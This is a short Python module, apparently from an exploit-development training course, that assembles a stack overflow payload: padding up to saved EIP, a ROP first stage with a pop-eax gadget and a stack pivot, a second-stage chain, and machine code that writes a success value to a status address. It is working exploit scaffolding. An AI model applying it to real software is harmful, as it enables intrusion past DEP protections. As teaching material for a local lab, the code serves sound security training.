"""Instructor-only layout helpers for the local DEP-2 training profile."""

from __future__ import annotations

from struct import pack


OSED_STAGE_BYTES = 8192
_DWORD_LIMIT = 0xFFFFFFFF


def _dword(value: int, name: str) -> int:
    if not isinstance(value, int) or not 0 <= value <= _DWORD_LIMIT:
        raise ValueError(f"{name} must fit in a 32-bit DWORD")
    return value


def first_stage_prefix_length(saved_eip_offset: int) -> int:
    """Return bytes through saved EIP and exactly two subsequent DWORDs."""
    if not isinstance(saved_eip_offset, int) or saved_eip_offset < 0:
        raise ValueError("saved_eip_offset must be a non-negative integer")
    return saved_eip_offset + (3 * 4)


def build_status_proof(status_address: int, success_value: int) -> bytes:
    """Build `mov dword ptr [absolute], immediate; ret` proof instructions."""
    return b"\xC7\x05" + pack(
        "<II", _dword(status_address, "status_address"), _dword(success_value, "success_value")
    ) + b"\xC3"


def build_staged_payload(
    *,
    saved_eip_offset: int,
    pop_eax_ret: int,
    stage2_address: int,
    pivot: int,
    stage2_offset: int,
    stage2: bytes,
    proof: bytes,
) -> bytes:
    """Construct the mirrored first stage plus an independently staged chain."""
    prefix_length = first_stage_prefix_length(saved_eip_offset)
    if not isinstance(stage2_offset, int) or stage2_offset < prefix_length:
        raise ValueError("stage2_offset must follow the three-DWORD first stage")
    first_stage = pack(
        "<III",
        _dword(pop_eax_ret, "pop_eax_ret"),
        _dword(stage2_address, "stage2_address"),
        _dword(pivot, "pivot"),
    )
    payload = b"A" * saved_eip_offset + first_stage
    payload += b"A" * (stage2_offset - len(payload))
    payload += bytes(stage2) + bytes(proof)
    if len(payload) > OSED_STAGE_BYTES:
        raise ValueError("staged payload exceeds OSED_STAGE_BYTES")
    return payload
